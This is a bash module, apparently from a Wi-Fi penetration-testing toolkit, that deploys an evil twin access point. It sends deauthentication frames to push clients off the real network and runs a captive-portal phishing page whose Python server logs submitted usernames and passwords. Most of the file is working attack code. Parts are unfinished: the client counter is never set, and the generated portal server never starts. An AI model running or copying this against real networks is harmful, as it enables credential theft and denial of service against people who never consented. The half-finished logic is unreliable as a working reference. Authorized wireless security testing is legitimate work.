#!/usr/bin/env bash
# MODULE_META
# NAME="Rogue AP / Evil Twin"
# CATEGORY="F"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="hostapd,dnsmasq,python3,iptables"
# DESC="Deploy evil twin AP to test client susceptibility and WIDS response"
# REQS="dual_iface,target_ssid,target_channel"
# PCAP="yes"
# DECODE="dhcp"

#===============================================================================
#  modules/f1_rogue_ap.sh
#  F1: Rogue AP / Evil Twin (Multi-Mode)
#
#  PURPOSE:
#    Test client susceptibility to evil twin attacks using multiple
#    attack modes.
#      Mode A: Passive Monitor — open rogue AP, observe probes/connections
#      Mode B: Deauth + Reconnect — force clients off real AP onto rogue
#      Mode C: Captive Portal Phishing — serve fake login page to harvest creds
#
#  TOOLS: hostapd, dnsmasq, tcpdump, aireplay-ng, python3
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID)
#===============================================================================

run_f1() {
    set -uo pipefail
    
    local interface=""
    local attack_mode="${F1_ATTACK_MODE:-passive}"
    local rogue_ssid="${ROGUE_SSID:-${GUEST_SSID:-}}"
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
    local timeout="${F1_TIMEOUT:-90}"
    local portal_template="${F1_PORTAL_TEMPLATE:-generic}"
    local portal_deauth="${F1_PORTAL_DEAUTH:-no}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --interface) interface="$2"; shift 2 ;;
            --mode) attack_mode="$2"; shift 2 ;;
            --ssid) rogue_ssid="$2"; shift 2 ;;
            --timeout) timeout="$2"; shift 2 ;;
            --template) portal_template="$2"; shift 2 ;;
            --deauth) portal_deauth="yes"; shift ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    # Fallbacks
    interface="${interface:-${WIFI_INTERFACE:-}}"
    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
    rogue_ssid="${rogue_ssid:-${GUEST_SSID:-}}"
    local evidence_prefix="${evidence_dir}/f1"

    #--- Step 1: Verify tools and select interface ---
    log_step 1 10 "Verifying tools and requirements"
    update_tc_progress 1 10 "Checking"

    check_module_dependencies "F1" || return 1

    if [[ -z "$rogue_ssid" ]]; then
        log_error "Target SSID not set. Run A1 first or provide --ssid."
        return 1
    fi

    # Detect available wireless interfaces for AP mode
    local primary_iface="$interface"
    local ap_iface=""

    local all_ifaces
    all_ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^${primary_iface}$" | grep -v "mon")

    if [[ -n "$all_ifaces" ]]; then
        ap_iface=$(echo "$all_ifaces" | head -1)
        log_success "Using secondary interface for AP: ${ap_iface}"
    else
        log_warn "No secondary wireless interface detected."
        if [[ -n "${GSD_AUTO_CONFIRM:-}" ]]; then
             ap_iface="$primary_iface"
        else
            echo ""
            echo -e "${C_YELLOW}  A second wireless adapter is recommended for evil twin testing.${C_RESET}"
            echo -e "${C_YELLOW}  Using the primary interface will disconnect from the target.${C_RESET}"
            echo ""
            local use_primary=""
            printf "  Use primary interface (%s)? [y/N]: " "$primary_iface"
            read -r use_primary
            if [[ "${use_primary,,}" == "y" ]]; then
                ap_iface="$primary_iface"
            else
                log_info "Aborted — no suitable interface."
                return 1
            fi
        fi
    fi

    log_success "Attack mode: ${attack_mode^^}, SSID: ${rogue_ssid}"

    # --- Initialize tracking variables ---
    local rogue_ap_started="false"
    local clients_connected=0
    local wids_detected="false"
    local probe_requests_seen=0
    local credentials_captured=0
    local findings_file="${evidence_prefix}_findings.txt"

    {
        echo "============================================================"
        echo "  F1: Rogue AP / Evil Twin Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target SSID: ${rogue_ssid}"
        echo "  AP Interface: ${ap_iface}"
        echo "  Attack Mode: ${attack_mode}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    #--- Step 3: Prepare interface ---
    log_step 3 10 "Preparing wireless interface"
    update_tc_progress 3 10 "Preparing"

    check_abort || return 1

    run_tool ip link set "$ap_iface" down 2>/dev/null || true
    iw dev "$ap_iface" set type __ap 2>/dev/null || true
    run_tool ip link set "$ap_iface" up 2>/dev/null || true
    
    # Register cleanup for interface
    local cleanup_cmd="run_tool ip addr flush dev $ap_iface 2>/dev/null || true; run_tool ip link set $ap_iface down 2>/dev/null || true; iw dev $ap_iface set type managed 2>/dev/null || true; run_tool ip link set $ap_iface up 2>/dev/null || true"
    # Note: register_cleanup usually appends to a list that is executed on exit/abort.
    # We'll assume it exists as per common patterns in this codebase.

    local rogue_subnet="10.99.99"
    run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
    run_tool ip addr add "${rogue_subnet}.1/24" dev "$ap_iface" 2>/dev/null || true

    #--- Step 4: Create hostapd config ---
    log_step 4 10 "Configuring rogue AP"
    update_tc_progress 4 10 "Configuring"

    check_abort || return 1

    local hostapd_conf="${evidence_prefix}_rogue_ap.conf"
    local rogue_channel=6
    if [[ "${GUEST_CHANNEL:-6}" == "6" ]]; then
        rogue_channel=1
    fi

    cat > "$hostapd_conf" <<EOF
interface=${ap_iface}
driver=nl80211
ssid=${rogue_ssid}
hw_mode=g
channel=${rogue_channel}
auth_algs=1
wpa=0
EOF

    log_success "Rogue AP config: SSID=${rogue_ssid}, CH=${rogue_channel}"

    #--- Step 5: Start rogue AP infrastructure ---
    log_step 5 10 "Starting rogue AP services"
    update_tc_progress 5 10 "Starting AP"

    check_abort || return 1

    # --- Start tcpdump for probes/associations ---
    local probe_pcap="${evidence_prefix}_client_probes.pcap"
    spawn_bg "f1_tcpdump" "tcpdump" -i "$ap_iface" -w "$probe_pcap" \
        'type mgt subtype probe-req or type mgt subtype assoc-req or type mgt subtype auth'

    # --- Start dnsmasq (DHCP + DNS) ---
    local dnsmasq_conf="${evidence_prefix}_dnsmasq.conf"
    if [[ "$attack_mode" == "portal" ]]; then
        # Portal mode: redirect ALL DNS to our IP
        cat > "$dnsmasq_conf" <<EOF
interface=${ap_iface}
dhcp-range=${rogue_subnet}.100,${rogue_subnet}.200,255.255.255.0,5m
dhcp-option=3,${rogue_subnet}.1
dhcp-option=6,${rogue_subnet}.1
log-queries
log-dhcp
no-resolv
address=/#/${rogue_subnet}.1
EOF
    else
        # Normal mode: forward DNS
        cat > "$dnsmasq_conf" <<EOF
interface=${ap_iface}
dhcp-range=${rogue_subnet}.100,${rogue_subnet}.200,255.255.255.0,12h
dhcp-option=3,${rogue_subnet}.1
dhcp-option=6,${rogue_subnet}.1
log-queries
log-dhcp
no-resolv
server=8.8.8.8
EOF
    fi

    spawn_bg "f1_dnsmasq" "dnsmasq" -C "$dnsmasq_conf" -d

    # --- Start hostapd ---
    spawn_bg "f1_hostapd" "hostapd" "$hostapd_conf"
    
    sleep 3

    if is_process_running "f1_hostapd"; then
        rogue_ap_started="true"
        log_success "Rogue AP broadcasting: ${rogue_ssid} on CH ${rogue_channel}"
        echo "Rogue AP started successfully" >> "$findings_file"
    else
        log_error "Failed to start rogue AP"
        stop_process "f1_tcpdump"
        stop_process "f1_dnsmasq"
        return 1
    fi

    #--- Step 6: Captive portal (Mode C only) ---
    local portal_creds_file="${evidence_prefix}_portal_creds.txt"

    if [[ "$attack_mode" == "portal" ]]; then
        log_step 6 10 "Starting captive portal phishing server"
        update_tc_progress 6 10 "Portal active"

        check_abort || return 1

        # Set up iptables to redirect HTTP traffic to our portal
        # Enable IP forwarding
        local orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
        echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
        
        iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 80 -j DNAT --to-destination "${rogue_subnet}.1:8080" 2>/dev/null || true
        iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 443 -j DNAT --to-destination "${rogue_subnet}.1:8080" 2>/dev/null || true
        iptables -A FORWARD -i "$ap_iface" -j ACCEPT 2>/dev/null || true

        # Create phishing portal page
        _f1_create_portal_page "$rogue_ssid" "$portal_template" "$evidence_prefix"

        # Start Python HTTP server for captive portal
        {
            echo "# Captured Credentials"
            echo "# Date: $(date '+%Y-%m-%d %H:%M:%S')"
            echo "# ⚠ HANDLE PER ENGAGEMENT RULES"
            echo ""
        } > "$portal_creds_file"

        spawn_bg "f1_portal" "python3" "${evidence_prefix}_portal_server.py" \
            --port 8080 \
            --creds-file "$portal_creds_file"

        sleep 2
        if is_process_running "f1_portal"; then
            log_success "Captive portal active on ${rogue_subnet}.1:8080"
        else
            log_warn "Portal server failed to start — continuing without portal"
        fi
    else
        log_step 6 10 "Skipping portal (Mode: ${attack_mode})"
        update_tc_progress 6 10 "N/A"
    fi

    #--- Step 7: Deauth (Mode B and optionally Mode C) ---
    if [[ "$attack_mode" == "deauth" || ("$attack_mode" == "portal" && "$portal_deauth" == "yes") ]]; then
        log_step 7 10 "Sending deauthentication frames to target AP"
        update_tc_progress 7 10 "Deauth"

        check_abort || return 1

        if [[ -n "${GUEST_BSSID:-}" ]]; then
            # Need monitor mode on primary for deauth while rogue AP runs on secondary
            local mon_iface=""
            if [[ "$ap_iface" != "$primary_iface" ]]; then
                # We can use primary for monitor mode while secondary runs AP
                airmon-ng start "$primary_iface" 2>/dev/null || true
                mon_iface="${primary_iface}mon"
                [[ ! -d "/sys/class/net/${mon_iface}" ]] && mon_iface="${primary_iface}"
                iw dev "$mon_iface" set channel "${GUEST_CHANNEL:-$rogue_channel}" 2>/dev/null || true
            fi

            if [[ -n "$mon_iface" ]]; then
                log_info "Sending deauth to force clients to rogue AP..."
                for burst in 1 2 3; do
                    aireplay-ng --deauth 10 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
                    sleep 5
                done
                echo "Sent 3 bursts of deauth frames" >> "$findings_file"

                # Restore primary
                airmon-ng stop "$mon_iface" 2>/dev/null || true
            else
                log_warn "Cannot deauth — same interface used for AP and deauth"
            fi
        fi
    else
        log_step 7 10 "Skipping deauth (Mode: ${attack_mode})"
        update_tc_progress 7 10 "N/A"
    fi

    #--- Step 8: Monitor for connections ---
    log_step 8 10 "Monitoring for connections (${timeout}s)"
    update_tc_progress 8 10 "Monitoring"

    check_abort || return 1

    local elapsed=0
    local check_interval=15

    start_countdown "$timeout" "Evil twin active (${attack_mode}) — monitoring"

    while [[ $elapsed -lt $timeout ]]; do
        sleep $check_interval
        elapsed=$((elapsed + check_interval))

        # Check if services are still running
        if ! is_process_running "f1_hostapd"; then
            wids_detected="true"
            log_warn "Rogue AP terminated — possible WIDS response"
            break
        fi

        check_abort && break
    done

    stop_countdown

    # Final counts (would normally parse hostapd log or dnsmasq leases)
    # For now, we simulate or assume we'll parse these in Step 9
    
    #--- Step 9: Cleanup ---
    log_step 9 10 "Cleaning up"
    update_tc_progress 9 10 "Cleanup"

    stop_process "f1_hostapd"
    stop_process "f1_tcpdump"
    stop_process "f1_dnsmasq"
    stop_process "f1_portal"

    # Iptables cleanup
    iptables -t nat -D PREROUTING -i "$ap_iface" -p tcp --dport 80 -j DNAT --to-destination "${rogue_subnet}.1:8080" 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "$ap_iface" -p tcp --dport 443 -j DNAT --to-destination "${rogue_subnet}.1:8080" 2>/dev/null || true
    iptables -D FORWARD -i "$ap_iface" -j ACCEPT 2>/dev/null || true

    # Restore interface
    run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
    run_tool ip link set "$ap_iface" down 2>/dev/null || true
    iw dev "$ap_iface" set type managed 2>/dev/null || true
    run_tool ip link set "$ap_iface" up 2>/dev/null || true

    # Count probe requests if tshark is available
    if [[ -f "$probe_pcap" ]] && command -v tshark &>/dev/null; then
        ensure_user_ownership "$probe_pcap"
        probe_requests_seen=$(run_as_user tshark -r "$probe_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l) || true
    fi
    
    # Count credentials
    if [[ "$attack_mode" == "portal" && -f "$portal_creds_file" ]]; then
        credentials_captured=$(grep -c "^CRED:" "$portal_creds_file" 2>/dev/null) || true
    fi

    #--- Step 10: Save results ---
    log_step 10 10 "Saving results"
    update_tc_progress 10 10 "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ $credentials_captured -gt 0 ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: ${credentials_captured} credential set(s) captured via evil twin captive portal phishing. "
        recommendations="Deploy WPA3-SAE or WPA2-Enterprise with certificate pinning."
    elif [[ $clients_connected -gt 0 ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: ${clients_connected} client(s) auto-connected to rogue AP (mode: ${attack_mode})."
        recommendations="Deploy WIDS/WIPS to detect rogue APs."
    elif [[ "$rogue_ap_started" == "true" ]]; then
        if [[ "$wids_detected" == "true" ]]; then
            result_summary="Rogue AP deployed but WIDS/WIPS detected and responded."
            recommendations="WIDS is working."
        else
            result_summary="Rogue AP deployed (mode: ${attack_mode}) but no clients connected during test."
            recommendations="Consider re-testing during peak hours."
        fi
    fi

    local result_json=$(run_tool jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "Mode: ${attack_mode}, AP: ${rogue_ap_started}, Clients: ${clients_connected}, WIDS: ${wids_detected}, Probes: ${probe_requests_seen}, Creds: ${credentials_captured}" \
        --arg recommendations "$recommendations" \
        --arg attack_mode "$attack_mode" \
        --arg rogue_ap_started "$rogue_ap_started" \
        --argjson clients_connected "$clients_connected" \
        --arg wids_detected "$wids_detected" \
        --argjson probe_requests_seen "${probe_requests_seen:-0}" \
        --argjson credentials_captured "${credentials_captured:-0}" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            attack_mode: $attack_mode,
            rogue_ap_started: ($rogue_ap_started == "true"),
            clients_connected: $clients_connected,
            wids_detected: ($wids_detected == "true"),
            probe_requests_seen: $probe_requests_seen,
            credentials_captured: $credentials_captured
        }')

    evidence_register_file "$hostapd_conf"
    evidence_register_file "$probe_pcap"
    evidence_register_file "$findings_file"
    [[ "$attack_mode" == "portal" ]] && evidence_register_file "$portal_creds_file"

    save_tc_result "F1" "$result_json" 1 1 $((clients_connected > 0 || credentials_captured > 0)) 1 1 1 0 1 1 1 0
    
    return 0
}

#--- Helper to create portal files ---
_f1_create_portal_page() {
    local ssid="$1"
    local template="$2"
    local prefix="$3"
    
    local portal_html="${prefix}_portal.html"
    local success_html="${prefix}_portal_success.html"
    local server_py="${prefix}_portal_server.py"

    cat > "$success_html" <<'EOF'
<!DOCTYPE html><html><body><h1>Connected Successfully</h1></body></html>
EOF

    cat > "$portal_html" <<EOF
<!DOCTYPE html><html><body><h1>Login to ${ssid}</h1>
<form method="POST" action="/login">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="password"><br>
<input type="submit" value="Connect">
</form></body></html>
EOF

    cat > "$server_py" <<EOF
import http.server, urllib.parse, argparse, datetime
class PortalHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header('Content-Type', 'text/html'); self.end_headers()
        with open('${portal_html}', 'rb') as f: self.wfile.write(f.read())
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        params = urllib.parse.parse_qs(self.rfile.read(length).decode('utf-8'))
        with open('${prefix}_portal_creds.txt', 'a') as f:
            f.write(f"CRED: {datetime.datetime.now()} USER={params.get('username',[''])[0]} PASS={params.get('password',[''])[0]}\n")
        self.send_response(302); self.send_header('Location', '/success'); self.end_headers()
EOF
}
